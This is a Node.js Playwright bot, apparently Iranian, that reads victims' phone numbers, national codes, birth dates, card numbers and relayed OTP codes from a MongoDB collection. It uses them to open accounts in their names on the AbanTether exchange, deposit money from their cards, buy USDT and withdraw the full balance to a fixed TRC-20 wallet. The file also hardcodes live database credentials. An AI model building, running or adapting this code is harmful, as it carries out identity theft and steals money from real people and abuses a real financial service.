const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');

class AbanTetherBot {
    constructor() {
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        this.website = {
            baseUrl: 'https://abantether.com',
            registerUrl: 'https://abantether.com/register',
            timeout: 30000,
            headless: true
        };
        
        this.transaction = {
            depositAmount: '5000000',
            withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
            maxRetries: 3
        };
        
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.processingUsers = new Set();
    }

    async initialize() {
        console.log('🚀 شروع ربات آبان تتر...');
        this.mongoClient = new MongoClient(this.mongoUri);
        await this.mongoClient.connect();
        this.db = this.mongoClient.db(this.dbName);
        this.collection = this.db.collection(this.collectionName);
        console.log('✅ متصل به MongoDB');
    }

    async startPolling() {
        console.log('🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)...');
        await this.checkDatabase();
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.transaction.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            
            console.log(`📊 ${pendingUsers.length} کاربر نیازمند پردازش پیدا شد`);
            
            for (const user of pendingUsers) {
                if (this.processingUsers.has(user.personalPhoneNumber)) {
                    console.log(`⏭️ کاربر ${user.personalPhoneNumber} در حال پردازش است`);
                    continue;
                }
                
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.transaction.maxRetries) {
                    console.log(`⛔ کاربر ${user.personalPhoneNumber} بیش از حد تلاش کرده`);
                    await this.markUserFailed(user.personalPhoneNumber, 'تعداد تلاش‌ها بیش از حد مجاز');
                    continue;
                }
                
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی دیتابیس:', error);
        }
    }

    async processUser(user) {
        const phoneNumber = user.personalPhoneNumber;
        console.log(`👤 شروع پردازش کاربر: ${phoneNumber}`);
        
        this.processingUsers.add(phoneNumber);
        
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date(),
                        retryCount: (user.retryCount || 0)
                    },
                    $inc: { __v: 1 }
                }
            );
            
            const result = await this.executeUserProcess(user);
            
            if (result.success) {
                console.log(`✅ کاربر ${phoneNumber} با موفقیت پردازش شد`);
                await this.markUserCompleted(phoneNumber, result.details);
            } else {
                console.log(`❌ خطا در پردازش کاربر ${phoneNumber}: ${result.error}`);
                await this.markUserFailed(phoneNumber, result.error, result.retry);
            }
            
        } catch (error) {
            console.error(`💥 خطای بحرانی در پردازش کاربر ${phoneNumber}:`, error);
            await this.markUserFailed(phoneNumber, `خطای بحرانی: ${error.message}`, true);
        } finally {
            this.processingUsers.delete(phoneNumber);
        }
    }

    async executeUserProcess(user) {
        let browser = null;
        let page = null;
        
        try {
            browser = await chromium.launch({
                headless: this.website.headless,
                args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
            
            const context = await browser.newContext({
                viewport: { width: 1280, height: 720 },
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            });
            
            page = await context.newPage();
            await page.setDefaultTimeout(this.website.timeout);
            
            console.log(`🌐 مرحله 1: رفتن به صفحه ثبت‌نام`);
            await page.goto(this.website.registerUrl, { waitUntil: 'networkidle' });
            await page.waitForTimeout(2000);
            
            console.log(`📱 مرحله 2: وارد کردن شماره موبایل`);
            await this.findAndFill(page, 'موبایل', user.personalPhoneNumber);
            await this.findAndClick(page, 'ادامه');
            await page.waitForTimeout(2000);
            
            console.log(`🔢 مرحله 3: منتظر OTP`);
            const otpLogin = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_login');
            if (!otpLogin) throw new Error('OTP دریافت نشد');
            
            await this.enterOtp(page, otpLogin);
            await this.findAndClick(page, 'تأیید');
            await page.waitForTimeout(3000);
            
            console.log(`🔐 مرحله 4: ایجاد رمز عبور`);
            const password = 'Aa123456!@#';
            await this.findAndFill(page, 'رمز عبور', password);
            await this.findAndClick(page, 'تکمیل ثبت‌نام');
            await page.waitForTimeout(3000);
            
            console.log(`🆔 مرحله 5: احراز هویت پایه`);
            await this.findAndFill(page, 'کد ملی', user.personalNationalCode);
            await this.findAndFill(page, 'تاریخ تولد', user.personalBirthDate);
            await this.findAndClick(page, 'تأیید اطلاعات');
            await page.waitForTimeout(5000);
            
            console.log(`💳 مرحله 6: ثبت کارت بانکی`);
            await this.findAndClick(page, 'حساب بانکی');
            await page.waitForTimeout(2000);
            
            await this.findAndClick(page, 'افزودن کارت جدید');
            await page.waitForTimeout(2000);
            
            await this.findAndFill(page, 'شماره کارت', user.cardNumber);
            await this.findAndClick(page, 'ثبت کارت');
            await page.waitForTimeout(3000);
            
            console.log(`📄 مرحله 7: تکمیل KYC`);
            await this.findAndClick(page, 'احراز هویت');
            await page.waitForTimeout(2000);
            
            await this.findAndClick(page, 'ارسال مدارک');
            await page.waitForTimeout(5000);
            
            console.log(`💰 مرحله 8: واریز تومان`);
            await this.findAndClick(page, 'کیف پول');
            await page.waitForTimeout(2000);
            
            await this.findAndClick(page, 'واریز تومان');
            await page.waitForTimeout(2000);
            
            await this.findAndClick(page, 'واریز آنلاین (درگاه پرداخت)');
            await page.waitForTimeout(2000);
            
            await this.findAndFill(page, 'مبلغ واریزی', this.transaction.depositAmount);
            await this.findAndClick(page, 'ایجاد درخواست واریز');
            await page.waitForTimeout(3000);
            
            const otpPayment = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_payment');
            if (!otpPayment) throw new Error('OTP پرداخت دریافت نشد');
            
            await this.enterOtp(page, otpPayment);
            await this.findAndClick(page, 'پرداخت');
            await page.waitForTimeout(10000);
            
            console.log(`🔄 مرحله 9: خرید تتر`);
            await this.findAndClick(page, 'معامله فوری');
            await page.waitForTimeout(2000);
            
            await this.selectFromDropdown(page, 'تتر (USDT)');
            await page.waitForTimeout(1000);
            
            await this.findAndFill(page, 'مبلغ تومان', this.transaction.depositAmount);
            await this.findAndClick(page, 'تایید و خرید');
            await page.waitForTimeout(5000);
            
            console.log(`📤 مرحله 10: برداشت تتر`);
            await this.findAndClick(page, 'کیف پول');
            await page.waitForTimeout(2000);
            
            await this.findAndClick(page, 'برداشت رمزارز');
            await page.waitForTimeout(2000);
            
            await this.selectFromDropdown(page, 'تتر (USDT)');
            await page.waitForTimeout(1000);
            
            await this.selectFromDropdown(page, 'TRC-20');
            await page.waitForTimeout(1000);
            
            await this.findAndFill(page, 'آدرس کیف پول مقصد', this.transaction.withdrawAddress);
            await this.findAndClick(page, 'همه موجودی');
            await page.waitForTimeout(1000);
            
            await this.findAndClick(page, 'ثبت درخواست برداشت');
            await page.waitForTimeout(3000);
            
            const otpWithdraw = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_payment');
            if (otpWithdraw) {
                await this.enterOtp(page, otpWithdraw);
                await this.findAndClick(page, 'تأیید');
            }
            
            await page.waitForTimeout(5000);
            
            return {
                success: true,
                details: {
                    stepsCompleted: ['register', 'verify', 'card', 'kyc', 'deposit', 'buy', 'withdraw'],
                    completedAt: new Date()
                }
            };
            
        } catch (error) {
            console.error('❌ خطا در اجرای فرآیند:', error);
            return {
                success: false,
                error: error.message,
                retry: true
            };
        } finally {
            if (page) await page.close();
            if (browser) await browser.close();
        }
    }

    async findAndFill(page, labelText, value) {
        const selectors = [
            `input[placeholder*="${labelText}"]`,
            `input[name*="${labelText.toLowerCase()}"]`,
            `input[id*="${labelText.toLowerCase()}"]`,
            `label:has-text("${labelText}") + input`,
            `//label[contains(text(), '${labelText}')]/following::input[1]`,
            `text=${labelText} >> .. >> input`,
            `[aria-label*="${labelText}"]`,
            `//*[contains(text(), '${labelText}')]/following::input[1]`
        ];
        
        for (const selector of selectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    await element.fill(value);
                    await page.waitForTimeout(500);
                    return true;
                }
            } catch {
                continue;
            }
        }
        
        const elements = await page.$$('input, textarea');
        for (const element of elements) {
            try {
                const placeholder = await element.getAttribute('placeholder');
                const name = await element.getAttribute('name');
                const id = await element.getAttribute('id');
                
                if (placeholder && placeholder.includes(labelText) ||
                    name && name.includes(labelText.toLowerCase()) ||
                    id && id.includes(labelText.toLowerCase())) {
                    await element.fill(value);
                    return true;
                }
            } catch {
                continue;
            }
        }
        
        throw new Error(`فیلد "${labelText}" پیدا نشد`);
    }

    async findAndClick(page, buttonText) {
        const selectors = [
            `button:has-text("${buttonText}")`,
            `a:has-text("${buttonText}")`,
            `//button[contains(text(), '${buttonText}')]`,
            `//a[contains(text(), '${buttonText}')]`,
            `[role="button"]:has-text("${buttonText}")`,
            `span:has-text("${buttonText}")`,
            `div:has-text("${buttonText}")`
        ];
        
        for (const selector of selectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    await element.click();
                    await page.waitForTimeout(1000);
                    return true;
                }
            } catch {
                continue;
            }
        }
        
        const allElements = await page.$$('button, a, div, span, input[type="button"], input[type="submit"]');
        for (const element of allElements) {
            try {
                const text = await element.textContent();
                if (text && text.includes(buttonText)) {
                    await element.click();
                    return true;
                }
            } catch {
                continue;
            }
        }
        
        throw new Error(`دکمه "${buttonText}" پیدا نشد`);
    }

    async selectFromDropdown(page, optionText) {
        const dropdownSelectors = [
            `select option:has-text("${optionText}")`,
            `//option[contains(text(), '${optionText}')]`,
            `div[role="option"]:has-text("${optionText}")`,
            `//div[contains(text(), '${optionText}')]`
        ];
        
        for (const selector of dropdownSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    await element.click();
                    return true;
                }
            } catch {
                continue;
            }
        }
        
        const allOptions = await page.$$('option, div[role="option"], li');
        for (const option of allOptions) {
            try {
                const text = await option.textContent();
                if (text && text.includes(optionText)) {
                    await option.click();
                    return true;
                }
            } catch {
                continue;
            }
        }
        
        throw new Error(`آپشن "${optionText}" در دراپ‌داون پیدا نشد`);
    }

    async enterOtp(page, otp) {
        const otpInputs = await page.$$('input[type="tel"], input[type="number"], input[maxlength="1"]');
        
        if (otpInputs.length >= 5) {
            for (let i = 0; i < Math.min(otpInputs.length, 6); i++) {
                if (otp[i]) {
                    await otpInputs[i].fill(otp[i]);
                }
            }
            return true;
        }
        
        const singleInput = await page.$('input[type="tel"][maxlength="6"], input[type="number"][maxlength="6"]');
        if (singleInput) {
            await singleInput.fill(otp);
            return true;
        }
        
        const inputs = await page.$$('input');
        for (const input of inputs) {
            const type = await input.getAttribute('type');
            if (type === 'tel' || type === 'number') {
                await input.fill(otp);
                return true;
            }
        }
        
        throw new Error('فیلد OTP پیدا نشد');
    }

    async waitForFieldInDatabase(phoneNumber, fieldName, maxAttempts = 60) {
        let attempts = 0;
        while (attempts < maxAttempts) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: phoneNumber },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    return user[fieldName];
                }
                
                attempts++;
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            }
        }
        
        return null;
    }

    async markUserCompleted(phoneNumber, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    },
                    $unset: {
                        otp_login: "",
                        otp_register_card: "",
                        otp_payment: ""
                    },
                    $inc: { __v: 1 }
                }
            );
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده:`, error);
        }
    }

    async markUserFailed(phoneNumber, reason, shouldRetry = false) {
        try {
            const updateData = {
                $set: {
                    status: 'failed',
                    failureReason: reason,
                    failedAt: new Date()
                },
                $inc: { __v: 1 }
            };
            
            if (shouldRetry) {
                updateData.$inc.retryCount = 1;
            } else {
                updateData.$set.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                updateData
            );
            
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان ناموفق:`, error);
        }
    }

    async cleanup() {
        if (this.mongoClient) {
            await this.mongoClient.close();
        }
    }
}

process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 خطای Reject نشده:', reason);
});

async function main() {
    const bot = new AbanTetherBot();
    
    try {
        await bot.initialize();
        await bot.startPolling();
        
        process.on('SIGINT', async () => {
            await bot.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', async () => {
            await bot.cleanup();
            process.exit(0);
        });
        
        await new Promise(() => {});
        
    } catch (error) {
        console.error('💥 خطای بحرانی در اجرای ربات:', error);
        await bot.cleanup();
        process.exit(1);
    }
}

if (require.main === module) {
    main();
}

module.exports = AbanTetherBot;